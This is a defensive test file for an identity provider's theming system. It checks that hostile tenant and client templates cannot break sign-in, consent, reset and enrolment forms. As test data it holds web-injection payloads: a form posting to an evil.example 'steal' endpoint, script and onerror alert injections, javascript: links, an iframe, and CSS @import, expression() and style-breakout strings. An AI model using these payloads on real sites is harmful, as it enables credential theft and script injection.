import { enqueueActionsLink, enqueueVerificationLink } from '@odudu/account';
import { requiredActionRepository, type RequiredAction } from '@odudu/authn-flows';
import { totpCode, totpCounter } from '@odudu/crypto';
import {
  createDatabase,
  MIGRATIONS_DIR,
  runMigrations,
  tenants,
  withTenant,
  type DatabaseHandle,
} from '@odudu/db';
import {
  credentialRepository,
  hashPassword,
  subjectRepository,
  userRepository,
} from '@odudu/domain-identity';
import { clients } from '@odudu/domain-tenant';
import { assetRepository, themeRepository, type ThemeBody } from '@odudu/domain-theme';
import { emailOutbox } from '@odudu/email';
import { PAGE_KINDS, newId, type PageKind } from '@odudu/kernel';
import {
  createAppRole,
  softwareRegistrationResponse,
  startTestDatabase,
  type TestDatabase,
} from '@odudu/testkit';
import { and, desc, eq } from 'drizzle-orm';
import { type FastifyInstance, type LightMyRequestResponse } from 'fastify';
import { parse } from 'parse5';
import { pino } from 'pino';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildApp } from '#/app';
import { createBranding, type Branding } from '#/branding';
import { seed } from '#/cli/seed';

// A tenant theme is written by someone who may mean harm, or who means well
// and gets it wrong. For every page kind with a form, a hostile template
// either never reaches the page or reaches it with the real form intact, and
// in both cases the flow completes exactly as it does with the default look.
// Each page is the real route's answer and the form is read back out of its
// HTML, the way a browser would submit it, hidden fields and all.

let container: TestDatabase;
let owner: DatabaseHandle;
let appDb: DatabaseHandle;
let app: FastifyInstance;
let branding: Branding;

const KEK = Buffer.alloc(32, 7);
const BASE = 'https://id.example.test';
const REDIRECT_URI = 'https://app.example/callback';
const CHALLENGE = 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM';
const PASSWORD = 'correct horse battery staple';
const NEW_PASSWORD = 'a much longer new passphrase';

beforeAll(async () => {
  container = await startTestDatabase();
  owner = createDatabase(container.adminUrl);
  await runMigrations(owner.db, MIGRATIONS_DIR);
  const appUrl = await createAppRole(container.adminUrl);
  appDb = createDatabase(appUrl, { max: 8 });
  process.env.ODUDU_DATABASE_URL = container.adminUrl;
  process.env.ODUDU_APP_DATABASE_URL = appUrl;
  process.env.ODUDU_KEK = KEK.toString('base64');
  const logger = pino({ level: 'silent' });
  branding = createBranding({ database: appDb, logger, publicBaseUrl: BASE });
  app = buildApp({
    database: appDb,
    ownerDatabase: owner,
    kek: KEK,
    logger,
    tls: false,
    publicBaseUrl: BASE,
    throttle: { limit: 1_000_000, windowSeconds: 60 },
    branding,
  });
  await app.ready();
}, 120_000);

afterAll(async () => {
  await app.close();
  delete process.env.ODUDU_DATABASE_URL;
  delete process.env.ODUDU_APP_DATABASE_URL;
  delete process.env.ODUDU_KEK;
  await appDb.close();
  await owner.close();
  await container.stop();
});

// ---- reading a page the way a browser does ----

interface Control {
  name: string;
  value: string;
  type: string;
  checked: boolean;
}

interface Form {
  id: string;
  action: string;
  method: string;
  controls: Control[];
  buttons: { name: string; value: string }[];
}

interface Script {
  nonce: string | null;
}

interface Reading {
  forms: Form[];
  scripts: Script[];
  attributes: string[];
}

interface Node5 {
  nodeName: string;
  attrs?: { name: string; value: string }[];
  childNodes?: Node5[];
  content?: Node5;
}

const attr = (node: Node5, name: string): string | null =>
  node.attrs?.find((a) => a.name === name)?.value ?? null;

function read(html: string): Reading {
  const reading: Reading = { forms: [], scripts: [], attributes: [] };
  const inside = (node: Node5, form: Form | null): void => {
    for (const a of node.attrs ?? []) reading.attributes.push(`${a.name}=${a.value}`);
    let current = form;
    if (node.nodeName === 'form') {
      current = {
        id: attr(node, 'id') ?? '',
        action: attr(node, 'action') ?? '',
        method: (attr(node, 'method') ?? 'get').toLowerCase(),
        controls: [],
        buttons: [],
      };
      reading.forms.push(current);
    }
    if (node.nodeName === 'script') reading.scripts.push({ nonce: attr(node, 'nonce') });
    if (current !== null && node.nodeName === 'input') {
      const type = (attr(node, 'type') ?? 'text').toLowerCase();
      const name = attr(node, 'name') ?? '';
      if (name !== '') {
        current.controls.push({
          name,
          value: attr(node, 'value') ?? '',
          type,
          checked: attr(node, 'checked') !== null,
        });
      }
    }
    if (current !== null && node.nodeName === 'button') {
      const type = (attr(node, 'type') ?? 'submit').toLowerCase();
      if (type === 'submit') {
        current.buttons.push({ name: attr(node, 'name') ?? '', value: attr(node, 'value') ?? '' });
      }
    }
    for (const child of node.childNodes ?? []) inside(child, current);
  };
  inside(parse(html), null);
  return reading;
}

// The sign-in page may also hold the optional passkey form; the form a page
// is for is the other one. On the passkey enrolment page it is the only one.
const UUID = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gu;
const PASSKEY_FORM = 'passkey-form';
const mainForms = (forms: Form[], kind: PageKind): Form[] =>
  forms.filter((form) => form.id !== PASSKEY_FORM || kind === 'passkey-enrolment');

// What a form is, with the values left out: the names a hostile theme must
// not add to, drop or repeat.
function shapeOf(res: LightMyRequestResponse, kind: PageKind): string {
  const reading = read(res.body);
  return JSON.stringify({
    forms: mainForms(reading.forms, kind).map((form) => ({
      action: form.action.replace(UUID, '_'),
      method: form.method,
      controls: form.controls.map((c) => `${c.type}:${c.name}`).sort(),
      buttons: form.buttons.map((b) => `${b.name}=${b.value.replace(UUID, '_')}`).sort(),
    })),
  });
}

function signature(res: LightMyRequestResponse): string {
  const location = res.headers.location;
  const target = typeof location === 'string' ? new URL(location, BASE) : null;
  return JSON.stringify({
    status: res.statusCode,
    to: target === null ? null : `${target.origin}${target.pathname}`,
    code: target?.searchParams.has('code') ?? null,
    title: /<title>([^<]*)<\/title>/u.exec(res.body)?.[1] ?? null,
  });
}

// Every page of a flow that wears the kind under test is held to this.
function expectIntact(
  res: LightMyRequestResponse,
  kind: PageKind,
  tenant: string,
  control: { shape: string; scripts: number },
): void {
  const reading = read(res.body);
  const forms = mainForms(reading.forms, kind);
  expect(forms, 'exactly one form').toHaveLength(1);
  expect(reading.forms.length - forms.length, 'at most one passkey form').toBeLessThanOrEqual(1);
  const [form] = forms;
  expect(form?.method).toBe('post');
  expect(form?.action.startsWith(`/tenants/${tenant}/`), `action ${form?.action ?? ''}`).toBe(true);
  const names = (form?.controls ?? []).filter((c) => c.type === 'hidden').map((c) => c.name);
  expect(new Set(names).size, `hidden fields ${names.join(',')}`).toBe(names.length);
  expect((form?.buttons ?? []).length, 'a submit button').toBeGreaterThan(0);
  expect(shapeOf(res, kind)).toBe(control.shape);
  // A script the page's optional part brings may go with it; the one a
  // required part brings (passkey enrolment's) may neither go nor repeat.
  const count = reading.scripts.length;
  if (kind === 'passkey-enrolment') expect(count).toBe(control.scripts);
  else expect(count).toBeLessThanOrEqual(control.scripts);
  const scripts = reading.scripts;
  expect(
    scripts.filter((s) => s.nonce === null),
    'a script without a nonce',
  ).toEqual([]);
  const policy = String(res.headers['content-security-policy']);
  const policyNonces = [...policy.matchAll(/'nonce-([^']+)'/gu)].map((m) => m[1]);
  expect(policyNonces.length, 'one nonce named by the policy').toBe(scripts.length === 0 ? 0 : 1);
  for (const script of scripts) expect(script.nonce).toBe(policyNonces[0]);
  expect(res.body).not.toContain('evil.example');
  expect(reading.attributes.filter((a) => /^on[a-z]+=|javascript:/iu.test(a))).toEqual([]);
}

// ---- driving the real routes ----

class Browser {
  private readonly jar = new Map<string, string>();

  get cookie(): string {
    return [...this.jar].map(([name, value]) => `${name}=${value}`).join('; ');
  }

  private keep(res: LightMyRequestResponse): void {
    const raw = res.headers['set-cookie'];
    for (const line of raw === undefined ? [] : Array.isArray(raw) ? raw : [raw]) {
      const [pair = ''] = line.split(';');
      const at = pair.indexOf('=');
      const name = pair.slice(0, at);
      const value = pair.slice(at + 1);
      if (value === '' || /max-age=0/iu.test(line)) this.jar.delete(name);
      else this.jar.set(name, value);
    }
  }

  async get(url: string): Promise<LightMyRequestResponse> {
    const res = await app.inject({ url, headers: { cookie: this.cookie } });
    this.keep(res);
    return res;
  }

  async post(url: string, fields: URLSearchParams): Promise<LightMyRequestResponse> {
    const res = await app.inject({
      method: 'POST',
      url,
      payload: fields.toString(),
      headers: { 'content-type': 'application/x-www-form-urlencoded', cookie: this.cookie },
    });
    this.keep(res);
    return res;
  }

  // Submits the page's one form as a browser does: every successful control
  // it holds, the values asked for filled in, and the button chosen.
  async submit(
    page: LightMyRequestResponse,
    fills: Record<string, string> = {},
    button?: { name: string; value?: string },
  ): Promise<LightMyRequestResponse> {
    const all = read(page.body).forms;
    const forms = all.filter((f) => f.id !== PASSKEY_FORM || all.length === 1);
    const [form] = forms;
    if (forms.length !== 1 || form === undefined) {
      throw new Error(`expected one form, found ${String(forms.length)}`);
    }
    const fields = new URLSearchParams();
    for (const control of form.controls) {
      if (control.type === 'checkbox' && !control.checked) continue;
      if (control.type === 'submit') continue;
      fields.append(control.name, control.value);
    }
    for (const [name, value] of Object.entries(fills)) {
      if (!form.controls.some((c) => c.name === name)) {
        throw new Error(
          `the form has no field ${name}, only ${form.controls.map((c) => c.name).join(', ')}`,
        );
      }
      fields.set(name, value);
    }
    const chosen =
      button === undefined
        ? (form.buttons.find((b) => b.name === '') ?? form.buttons[0])
        : form.buttons.find(
            (b) =>
              b.name === button.name && (button.value === undefined || b.value === button.value),
          );
    if (chosen === undefined) throw new Error('the form has no such button');
    if (chosen.name !== '') fields.set(chosen.name, chosen.value);
    return this.post(form.action, fields);
  }
}

interface World {
  name: string;
  tenantId: string;
}

async function world(): Promise<World> {
  const name = `hostile-${newId()}`;
  const seeded = await seed({
    tenant: name,
    clientId: 'portal',
    redirectUris: [REDIRECT_URI],
    username: `seeded${newId().slice(-8)}`,
    password: PASSWORD,
  });
  await owner.db
    .update(tenants)
    .set({ registrationAllowed: true, resetPasswordAllowed: true })
    .where(eq(tenants.id, seeded.tenantId));
  return { name, tenantId: seeded.tenantId };
}

interface User {
  subjectId: string;
  username: string;
  email: string;
}

async function addUser(w: World, owes: RequiredAction[] = []): Promise<User> {
  const username = `u${newId().slice(-10)}`;
  const email = `${username}@example.test`;
  const subjectId = await withTenant(appDb.db, w.tenantId, async (tx) => {
    const subject = await subjectRepository(tx).create({ tenantId: w.tenantId, type: 'user' });
    await userRepository(tx).create({
      subjectId: subject.id,
      tenantId: w.tenantId,
      username,
      email,
    });
    await credentialRepository(tx).insert({
      tenantId: w.tenantId,
      subjectId: subject.id,
      type: 'password',
      secret: { kind: 'password', hash: await hashPassword(PASSWORD) },
    });
    for (const action of owes) {
      await requiredActionRepository(tx).add(w.tenantId, subject.id, action);
    }
    return subject.id;
  });
  return { subjectId, username, email };
}

const authorizeUrl = (w: World, extra: Record<string, string> = {}): string =>
  `/tenants/${w.name}/protocol/openid-connect/auth?` +
  new URLSearchParams({
    response_type: 'code',
    client_id: 'portal',
    redirect_uri: REDIRECT_URI,
    scope: 'openid',
    state: 's',
    code_challenge: CHALLENGE,
    code_challenge_method: 'S256',
    ...extra,
  }).toString();

function mailedLink(res: string): string {
  const link = /https:\/\/id\.example\.test(\S+)/u.exec(res)?.[1];
  if (link === undefined) throw new Error('no link in the mail');
  return link;
}

async function lastMailTo(email: string): Promise<string> {
  const rows = await owner.db
    .select({ text: emailOutbox.bodyText })
    .from(emailOutbox)
    .where(eq(emailOutbox.toAddress, email))
    .orderBy(desc(emailOutbox.createdAt));
  return mailedLink(rows[0]?.text ?? '');
}

const tenantMail = (w: World) => ({
  tenantId: w.tenantId,
  tenantName: w.name,
  tenantDisplayName: w.name,
  issuerBase: BASE,
  now: () => new Date(),
});

// A flow runs from the first request to the answer that ends it, calling
// `themed(page)` on every page of the kind under test it reaches.
interface Steps {
  themed: (page: LightMyRequestResponse) => LightMyRequestResponse;
}

type Flow = (w: World, steps: Steps) => Promise<LightMyRequestResponse>;

async function signInAs(
  w: World,
  user: User,
  browser: Browser,
  extra: Record<string, string> = {},
): Promise<LightMyRequestResponse> {
  const form = await browser.get(authorizeUrl(w, extra));
  return browser.submit(form, { username: user.username, password: PASSWORD });
}

async function throughTotp(browser: Browser, page: LightMyRequestResponse) {
  const secret = read(page.body).forms[0]?.controls.find((c) => c.name === 'secret')?.value ?? '';
  return browser.submit(page, { code: totpCode(secret, totpCounter(new Date())) });
}

const FLOWS: Partial<Record<PageKind, Flow>> = {
  'sign-in': async (w, { themed }) => {
    const user = await addUser(w);
    const browser = new Browser();
    const page = themed(await browser.get(authorizeUrl(w)));
    return browser.submit(page, { username: user.username, password: PASSWORD });
  },

  consent: async (w, { themed }) => {
    const user = await addUser(w);
    const browser = new Browser();
    const consent = themed(await signInAs(w, user, browser, { prompt: 'consent' }));
    return browser.submit(consent, {}, { name: 'decision', value: 'allow' });
  },

  'select-account': async (w, { themed }) => {
    const user = await addUser(w);
    const browser = new Browser();
    const signedIn = await signInAs(w, user, browser);
    expect(signedIn.statusCode).toBe(302);
    const chooser = themed(await browser.get(authorizeUrl(w, { prompt: 'select_account' })));
    return browser.submit(chooser, {}, { name: 'session_id' });
  },

  'logout-confirm': async (w, { themed }) => {
    const user = await addUser(w);
    const browser = new Browser();
    expect((await signInAs(w, user, browser)).statusCode).toBe(302);
    const confirm = themed(await browser.get(`/tenants/${w.name}/protocol/openid-connect/logout`));
    return browser.submit(confirm);
  },

  'totp-enrolment': async (w, { themed }) => {
    const user = await addUser(w, ['configure-totp']);
    const browser = new Browser();
    const offer = themed(await signInAs(w, user, browser));
    const codes = await throughTotp(browser, offer);
    return browser.submit(codes);
  },

  'recovery-codes': async (w, { themed }) => {
    const user = await addUser(w, ['configure-totp']);
    const browser = new Browser();
    const offer = await signInAs(w, user, browser);
    const codes = themed(await throughTotp(browser, offer));
    return browser.submit(codes);
  },

  'passkey-enrolment': async (w, { themed }) => {
    const user = await addUser(w, ['configure-passkey']);
    const browser = new Browser();
    const page = themed(await signInAs(w, user, browser));
    const challenge = /"challenge":"([^"]*)"/u.exec(page.body)?.[1] ?? '';
    const credential = JSON.stringify(
      softwareRegistrationResponse({ challenge, rpId: 'id.example.test', origin: BASE }),
    );
    return browser.submit(page, { credential, label: 'Laptop' });
  },

  'update-password': async (w, { themed }) => {
    const user = await addUser(w, ['update-password']);
    const browser = new Browser();
    const page = themed(await signInAs(w, user, browser));
    return browser.submit(page, { password: NEW_PASSWORD });
  },

  registration: async (w, { themed }) => {
    const browser = new Browser();
    const page = themed(await browser.get(`/tenants/${w.name}/login-actions/registration`));
    const username = `r${newId().slice(-10)}`;
    return browser.submit(page, {
      username,
      email: `${username}@example.test`,
      password: NEW_PASSWORD,
      password_confirm: NEW_PASSWORD,
    });
  },

  reset: async (w, { themed }) => {
    const user = await addUser(w);
    const browser = new Browser();
    const request = themed(await browser.get(`/tenants/${w.name}/login-actions/reset-password`));
    const requested = await browser.submit(request, { email: user.email });
    expect(requested.statusCode).toBe(200);
    const form = themed(await browser.get(await lastMailTo(user.email)));
    return browser.submit(form, { password: NEW_PASSWORD });
  },

  verification: async (w, { themed }) => {
    const user = await addUser(w);
    await withTenant(appDb.db, w.tenantId, (tx) =>
      enqueueVerificationLink(tx, tenantMail(w), {
        subjectId: user.subjectId,
        email: user.email,
      }),
    );
    const browser = new Browser();
    const page = themed(await browser.get(await lastMailTo(user.email)));
    return browser.submit(page);
  },

  'required-actions': async (w, { themed }) => {
    const user = await addUser(w);
    await withTenant(appDb.db, w.tenantId, (tx) =>
      enqueueActionsLink(
        tx,
        tenantMail(w),
        { subjectId: user.subjectId, email: user.email },
        { actions: ['update-password'] },
      ),
    );
    const browser = new Browser();
    const page = themed(await browser.get(await lastMailTo(user.email)));
    return browser.submit(page, { password: NEW_PASSWORD });
  },
};

// ---- what a hostile theme is made of ----

const FORM_KINDS = Object.keys(FLOWS) as PageKind[];

const slots = (parts: readonly string[]): string => parts.map((p) => `{{${p}}}`).join('');

interface Hostile {
  name: string;
  // Never themed: a page wearing it would be broken or unsafe.
  refused: boolean;
  template: (kind: PageKind) => string;
}

const manifest = (kind: PageKind) => PAGE_KINDS[kind];
const full = (kind: PageKind): string =>
  slots([...manifest(kind).required, ...manifest(kind).optional]);
const wrap = (name: string, inner: string): string => `<div class="t-${name}">${inner}</div>`;

const HOSTILE: Hostile[] = [
  { name: 'ok', refused: false, template: (k) => wrap('ok', full(k)) },
  {
    name: 'required-only',
    refused: false,
    template: (k) => wrap('required-only', slots(manifest(k).required)),
  },
  {
    name: 'reordered',
    refused: true,
    template: (k) => wrap('reordered', slots([...manifest(k).required].reverse())),
  },
  {
    name: 'no-form-open',
    refused: true,
    template: (k) =>
      wrap('no-form-open', slots(manifest(k).required.filter((p) => p !== 'form.open'))),
  },
  {
    name: 'no-submit',
    refused: true,
    template: (k) =>
      wrap('no-submit', slots(manifest(k).required.filter((p) => !p.startsWith('submit')))),
  },
  {
    name: 'duplicated',
    refused: true,
    template: (k) => wrap('duplicated', `${full(k)}${slots(manifest(k).required)}`),
  },
  {
    name: 'attribute-slot',
    refused: true,
    template: (k) => `<div class="t-attribute-slot" title="{{form.open}}">${full(k)}</div>`,
  },
  {
    name: 'script',
    refused: true,
    template: (k) => wrap('script', `<script>alert(1)</script>${full(k)}`),
  },
  {
    name: 'script-slot',
    refused: true,
    template: (k) => wrap('script-slot', `{{script}}${full(k)}`),
  },
  {
    name: 'form-tags',
    refused: true,
    template: (k) =>
      wrap(
        'form-tags',
        `<form action="https://evil.example/steal" method="post">${full(k)}</form>`,
      ),
  },
  {
    name: 'handler',
    refused: true,
    template: (k) => wrap('handler', `<img src="x" onerror="alert(1)">${full(k)}`),
  },
  {
    name: 'link-and-iframe',
    refused: true,
    template: (k) =>
      wrap(
        'link-and-iframe',
        `<a href="javascript:alert(1)">x</a><iframe src="https://evil.example"></iframe>${full(k)}`,
      ),
  },
  {
    name: 'unknown-part',
    refused: true,
    template: (k) => wrap('unknown-part', `{{nonsense}}${full(k)}`),
  },
  {
    name: 'unknown-text-key',
    refused: true,
    template: (k) => wrap('unknown-text-key', `<p>{{t "no.such.key"}}</p>${full(k)}`),
  },
  {
    name: 'huge',
    refused: true,
    template: (k) => wrap('huge', `${'<p>x</p>'.repeat(20_000)}${full(k)}`),
  },
];

function bodyOf(kind: PageKind, hostile: Hostile): ThemeBody {
  return {
    tokens: {},
    stylesheet: null,
    templates: { [kind]: hostile.template(kind) },
    assets: {},
  };
}

async function publish(w: World, body: ThemeBody, clientId: string | null = null): Promise<void> {
  await withTenant(appDb.db, w.tenantId, async (tx) => {
    const themes = themeRepository(tx);
    const scope = { tenantId: w.tenantId, clientId };
    await themes.saveDraft(scope, body, (await themes.draft(scope))?.etag ?? null);
    await themes.publish(scope);
  });
  branding.invalidateTenant(w.tenantId);
}

interface Run {
  pages: LightMyRequestResponse[];
  final: LightMyRequestResponse;
}

function flowOf(kind: PageKind): Flow {
  const flow = FLOWS[kind];
  if (flow === undefined) throw new Error(`no flow for ${kind}`);
  return flow;
}

async function run(
  kind: PageKind,
  w: World,
  flows: Partial<Record<PageKind, Flow>> = FLOWS,
): Promise<Run> {
  const flow = flows[kind];
  if (flow === undefined) throw new Error(`no flow for ${kind}`);
  const pages: LightMyRequestResponse[] = [];
  const final = await flow(w, {
    themed: (page) => {
      pages.push(page);
      return page;
    },
  });
  return { pages, final };
}

interface Baseline {
  pages: { shape: string; scripts: number }[];
  final: string;
}

// The flow as the default look runs it: what each page's form is, and how it
// ends.
async function controlOf(
  kind: PageKind,
  w: World,
  flows: Partial<Record<PageKind, Flow>> = FLOWS,
): Promise<Baseline> {
  const baseline = await run(kind, w, flows);
  expect(baseline.pages.length).toBeGreaterThan(0);
  expect([200, 201, 302]).toContain(baseline.final.statusCode);
  return {
    pages: baseline.pages.map((page) => ({
      shape: shapeOf(page, kind),
      scripts: read(page.body).scripts.length,
    })),
    final: signature(baseline.final),
  };
}

describe('every page kind with a form is held to a form a theme cannot break', () => {
  it('has a flow for every page kind that has a form', () => {
    const withForm = (Object.keys(PAGE_KINDS) as PageKind[]).filter((kind) =>
      PAGE_KINDS[kind].required.includes('form.open'),
    );
    expect(FORM_KINDS.sort()).toEqual(withForm.sort());
  });

  describe.each(Object.keys(FLOWS) as PageKind[])('%s', (kind) => {
    let w: World;
    let control: Baseline;
    const themedBy = new Map<string, boolean>();

    beforeAll(async () => {
      w = await world();
      control = await controlOf(kind, w);
    }, 120_000);

    it.each(HOSTILE.map((h) => [h.name, h] as const))(
      'a %s template: the form is intact and the flow completes as by default',
      async (_name, hostile) => {
        await publish(w, bodyOf(kind, hostile));
        const outcome = await run(kind, w);
        expect(outcome.pages).toHaveLength(control.pages.length);
        outcome.pages.forEach((page, index) => {
          expectIntact(page, kind, w.name, control.pages[index] ?? { shape: '', scripts: 0 });
        });
        expect(signature(outcome.final)).toBe(control.final);
        const marker = `t-${hostile.name}`;
        const worn = outcome.pages.some((page) => page.body.includes(`class="${marker}"`));
        themedBy.set(hostile.name, worn);
        if (hostile.refused) expect(worn, 'a hostile template reached the page').toBe(false);
      },
      60_000,
    );

    it('a theme that is valid is worn, so the cases above are not vacuous', () => {
      expect(themedBy.get('ok')).toBe(true);
      expect(themedBy.get('required-only')).toBe(true);
    });
  });
});

describe('a stylesheet or an image a theme cannot use leaves the flow as it was', () => {
  const kind: PageKind = 'sign-in';
  let w: World;
  let control: Baseline;

  beforeAll(async () => {
    w = await world();
    control = await controlOf(kind, w);
  }, 120_000);

  const stylesheets: [string, string][] = [
    ['an @import', '@import url("https://evil.example/x.css");'],
    ['a url()', 'body { background: url(https://evil.example/p.png); }'],
    ['an expression()', 'a { width: expression(alert(1)); }'],
    ['a behavior', 'a { behavior: url(evil.htc); }'],
    ['a closing tag', '</style><script>alert(1)</script>'],
  ];

  it.each(stylesheets)('with %s', async (_name, stylesheet) => {
    await publish(w, {
      tokens: {},
      stylesheet,
      templates: { [kind]: wrap('ok', full(kind)) },
      assets: {},
    });
    const outcome = await run(kind, w);
    outcome.pages.forEach((page, index) => {
      expectIntact(page, kind, w.name, control.pages[index] ?? { shape: '', scripts: 0 });
      expect(page.body).not.toMatch(/evil\.example|@import|expression\(/u);
    });
    expect(signature(outcome.final)).toBe(control.final);
  });

  it("with an image that is another tenant's", async () => {
    const other = await world();
    const theirs = await withTenant(appDb.db, other.tenantId, (tx) =>
      assetRepository(tx).put({
        tenantId: other.tenantId,
        sha256: 'theirs'.padEnd(64, '0'),
        mime: 'image/png',
        width: 4,
        height: 3,
        bytes: Buffer.from('theirs'),
        tenantCapBytes: 4096,
      }),
    );
    if (theirs === 'over_cap') throw new Error('asset refused');
    await publish(w, {
      tokens: {},
      stylesheet: null,
      templates: { [kind]: wrap('theirs', full(kind)) },
      assets: { logo: { assetId: theirs.id, alt: 'theirs' } },
    });
    const outcome = await run(kind, w);
    outcome.pages.forEach((page) => {
      expect(page.body).not.toContain('t-theirs');
      expect(page.body).not.toContain(theirs.id);
    });
    expect(signature(outcome.final)).toBe(control.final);
  });
});

describe('a nonce a page names is the one its script carries', () => {
  it('keeps the passkey page to one nonce under every template', async () => {
    const w = await world();
    for (const hostile of HOSTILE) {
      await publish(w, bodyOf('passkey-enrolment', hostile));
      const { pages } = await run('passkey-enrolment', w);
      for (const page of pages) {
        const { scripts } = read(page.body);
        expect(scripts).toHaveLength(1);
        expect(String(page.headers['content-security-policy'])).toContain(
          `'nonce-${scripts[0]?.nonce ?? ''}'`,
        );
      }
    }
  }, 120_000);
});

// A client's own theme is layered over the tenant's, so the same hostile
// templates are held to the same account at that level. Logout wears the
// client only for a hint that verified, so its flow carries one.
describe('a hostile theme published for a client', () => {
  const VERIFIER = 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk';
  const CLIENT_FLOWS: Partial<Record<PageKind, Flow>> = {
    'sign-in': flowOf('sign-in'),
    consent: flowOf('consent'),
    'logout-confirm': async (w, { themed }) => {
      const user = await addUser(w);
      const browser = new Browser();
      const signedIn = await signInAs(w, user, browser);
      const code = new URL(String(signedIn.headers.location)).searchParams.get('code') ?? '';
      const token = await app.inject({
        method: 'POST',
        url: `/tenants/${w.name}/protocol/openid-connect/token`,
        payload: new URLSearchParams({
          grant_type: 'authorization_code',
          code,
          redirect_uri: REDIRECT_URI,
          code_verifier: VERIFIER,
          client_id: 'portal',
        }).toString(),
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
      });
      const hint = token.json<{ id_token: string }>().id_token;
      const confirm = themed(
        await browser.get(
          `/tenants/${w.name}/protocol/openid-connect/logout?${new URLSearchParams({ id_token_hint: hint }).toString()}`,
        ),
      );
      return browser.submit(confirm);
    },
  };
  const SPOT = HOSTILE.filter((h) =>
    ['ok', 'reordered', 'duplicated', 'form-tags', 'script', 'huge'].includes(h.name),
  );

  describe.each(Object.keys(CLIENT_FLOWS) as PageKind[])('%s', (kind) => {
    let w: World;
    let clientUuid: string;
    let control: Baseline;

    beforeAll(async () => {
      w = await world();
      const [row] = await owner.db
        .select({ id: clients.id })
        .from(clients)
        .where(and(eq(clients.tenantId, w.tenantId), eq(clients.clientId, 'portal')));
      clientUuid = row?.id ?? '';
      control = await controlOf(kind, w, CLIENT_FLOWS);
    }, 120_000);

    it.each(SPOT.map((h) => [h.name, h] as const))(
      'a %s template is refused or worn with the form intact',
      async (_name, hostile) => {
        await publish(w, bodyOf(kind, hostile), clientUuid);
        const outcome = await run(kind, w, CLIENT_FLOWS);
        expect(outcome.pages).toHaveLength(control.pages.length);
        outcome.pages.forEach((page, index) => {
          expectIntact(page, kind, w.name, control.pages[index] ?? { shape: '', scripts: 0 });
        });
        expect(signature(outcome.final)).toBe(control.final);
        const worn = outcome.pages.some((page) => page.body.includes(`class="t-${hostile.name}"`));
        expect(worn, 'worn exactly when the template is acceptable').toBe(!hostile.refused);
      },
      60_000,
    );
  });
});
